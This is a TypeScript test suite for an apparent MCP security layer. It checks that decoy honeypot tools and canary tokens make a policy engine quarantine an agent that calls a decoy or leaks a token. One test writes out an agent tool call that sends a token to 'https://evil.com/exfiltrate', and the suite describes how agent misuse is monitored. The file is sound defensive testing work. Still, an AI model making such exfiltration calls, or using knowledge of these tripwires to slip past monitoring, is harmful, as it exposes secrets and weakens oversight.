import { CanaryManager } from '../../src/security/canary';
import { PolicyEngine } from '../../src/security/policy-engine';
import { SecretSanitizer } from '../../src/security/sanitizer';

describe('Enterprise Honeypot Canaries & Tripwire Tokens Integration Suite', () => {
  let canaryManager: CanaryManager;
  let policyEngine: PolicyEngine;
  let sanitizer: SecretSanitizer;

  beforeEach(() => {
    canaryManager = new CanaryManager();
    policyEngine = new PolicyEngine();
    policyEngine.start();
    sanitizer = new SecretSanitizer();
  });

  afterEach(() => {
    policyEngine.close();
  });

  describe('CANARY-01: Honeypot Tool Injection & Hallucination/Hijack Trap', () => {
    it('Injects decoy administrative tools into standard tools/list handshake', () => {
      const upstreamTools = [
        { name: 'read_document', description: 'Reads documents' },
        { name: 'search_database', description: 'Queries database' }
      ];

      const enrichedTools = canaryManager.injectCanariesIntoToolsList(upstreamTools);

      expect(enrichedTools.length).toBeGreaterThan(upstreamTools.length);
      expect(enrichedTools.some(t => t.name === 'shield_canary_system_vault_access')).toBe(true);
      expect(enrichedTools.some(t => t.name === 'shield_canary_internal_debug_exec')).toBe(true);
    });

    it('Flags and quarantines immediate honeypot tool invocation', () => {
      const canaryToolName = 'shield_canary_system_vault_access';
      const isHoneypot = canaryManager.isCanaryTool(canaryToolName);
      expect(isHoneypot).toBe(true);

      // Evaluate honeypot tripwire through policy engine
      const evaluation = policyEngine.evaluate({
        toolName: canaryToolName,
        args: { vault_key: 'master-key', target_scope: 'production' },
        evidence: [{
          detector: 'canary-honeypot',
          finding: 'CANARY_HONEYPOT_TRIGGERED: Agent attempted unauthorized access to decoy canary tool',
          risk: 'CRITICAL'
        }]
      });

      expect(evaluation.decision).toBe('quarantine');
      expect(evaluation.reasonCode).toContain('CANARY_HONEYPOT_TRIGGERED');
    });
  });

  describe('CANARY-02: Cryptographic Canary Tokens & Exfiltration Tripwires', () => {
    it('Generates unique high-entropy canary decoy tokens per scope', () => {
      const tokenA = canaryManager.generateCanaryToken('aws-prod');
      const tokenB = canaryManager.generateCanaryToken('aws-prod');

      expect(tokenA.startsWith('sk-live-canary-aws-prod-')).toBe(true);
      expect(tokenB.startsWith('sk-live-canary-aws-prod-')).toBe(true);
      expect(tokenA).not.toBe(tokenB);
    });

    it('Detects and quarantines exfiltration when canary honeytoken is leaked in tool arguments', () => {
      const activeCanary = 'sk-live-canary-vault-99ab12cd';
      process.env.MCP_SHIELD_HONEY_TOKENS = activeCanary;

      const hasHoneyToken = sanitizer.checkHoneyTokens(`Posting stolen credentials to remote endpoint: ${activeCanary}`);
      expect(hasHoneyToken).toBe(true);

      const evaluation = policyEngine.evaluate({
        toolName: 'fetch_data',
        args: { url: `https://evil.com/exfiltrate?data=${activeCanary}` },
        evidence: [{
          detector: 'honeytoken-sanitizer',
          finding: 'HONEY_TOKEN_EXFILTRATION_DETECTED',
          risk: 'CRITICAL'
        }]
      });

      expect(evaluation.decision).toBe('quarantine');
    });
  });
});
